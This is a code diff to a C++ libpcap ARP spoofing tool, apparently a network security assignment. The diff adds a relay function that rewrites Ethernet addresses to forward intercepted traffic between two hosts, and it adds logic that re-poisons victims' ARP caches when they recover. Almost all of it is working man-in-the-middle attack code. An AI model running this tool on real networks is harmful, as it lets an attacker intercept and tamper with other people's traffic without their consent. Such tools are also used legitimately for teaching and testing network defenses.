@@ -57,8 +57,9 @@ struct ArpSpoofFlow {
     Ip s_ip;
     Ip t_ip;
     Mac s_mac;
-    Mac t_mac;
+    Mac t_mac; //me_mac
     bool haveToRelay;
+    Mac real_t_mac;
 };
 
 
@@ -358,8 +359,27 @@ EthArpPacket m_a_packet(Mac me_mac, Ip t_ip, Mac v_mac, Ip v_ip){
 
 }
 
-//TODO : fill m_a_packet
-//EthIpPacket m_relay_packet(Mac me_mac, Ip t_ip, Mac v_mac, Ip v_ip)
+//TODO : fill m_relay_packet
+u_char* m_relay_packet(const u_char* packet, Mac me_mac, Mac t_mac, uint32_t& out_len){
+
+    const u_char* cpacket = packet;
+    const EthHdr* ethHdr = (EthHdr*)(cpacket);
+    cpacket += sizeof(EthHdr);
+    IpHdr *ipHdr = (IpHdr*) cpacket;
+
+    uint16_t ip_total_len = ntohs(ipHdr->ip_len);
+    out_len = sizeof(EthHdr) + ip_total_len;
+
+    u_char* relay_packet = (u_char*)malloc(out_len);
+
+    memcpy(relay_packet, packet, out_len);
+
+    EthHdr* eth_hdr = (EthHdr*)(relay_packet);
+    eth_hdr->dmac_ = t_mac;
+    eth_hdr->smac_ = me_mac;
+
+    return relay_packet;
+}
 
 
 /* Go: Make Packet End */
@@ -446,11 +466,11 @@ int main(int argc, char* argv[]) {
             // target thinks sender's mac is me
             int res3 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&attack_packet_target), sizeof(EthArpPacket));
             if (res3 != 0) {
-                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(pcap));
+                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res3, pcap_geterr(pcap));
             }
 
-            spoof_flows.push_back({s_ip, ttt_ip, s_mac, me_mac, true});
-            spoof_flows.push_back({ttt_ip, s_ip, t_mac, me_mac, true});
+            spoof_flows.push_back({s_ip, ttt_ip, s_mac, me_mac, true, t_mac});
+            spoof_flows.push_back({ttt_ip, s_ip, t_mac, me_mac, true, s_mac});
 
 
             //pcap_close(pcap);
@@ -480,20 +500,33 @@ int main(int argc, char* argv[]) {
 
 
         //1. send relay packet
-        for (int i=0; i<repeat_time; i++)
+        for (int i=0; i<spoof_flows.size(); i++)
         {
+            //TODO : check is it IP
              if(!spoof_flows[i].haveToRelay||!isSpoofed(packet, spoof_flows[i].s_ip, spoof_flows[i].t_ip, spoof_flows[i].s_mac, spoof_flows[i].t_mac)) continue;
 
-             //m_relay_packet();
+             uint32_t relay_len = 0;
+             u_char* relayP = m_relay_packet(packet,me_mac,spoof_flows[i].real_t_mac,relay_len);
+             int res4 = pcap_sendpacket(pcap, relayP, relay_len);
+             if (res4 != 0) {
+                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res4, pcap_geterr(pcap));
+             }
+             free(relayP);
+
+
 
         }
 
         //2. check recover case and send reinfect packet
-        for (int i=0; i<repeat_time; i++)
+        for (int i=0; i<spoof_flows.size(); i++)
         {
             if(!isArp_and_Rq(packet)) continue;
             if(!isRecoverCase(packet, spoof_flows[i].s_ip)) continue;
-            m_a_packet(me_mac, spoof_flows[i].t_ip, spoof_flows[i].s_mac, spoof_flows[i].s_ip);
+            EthArpPacket reattack = m_a_packet(me_mac, spoof_flows[i].t_ip, spoof_flows[i].s_mac, spoof_flows[i].s_ip);
+            int res5 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&reattack), sizeof(EthArpPacket));
+            if (res5 != 0) {
+                fprintf(stderr, "reattack send error=%s\n", pcap_geterr(pcap));
+            }
             printf("re infect packet send\n"); //debug
 
         }
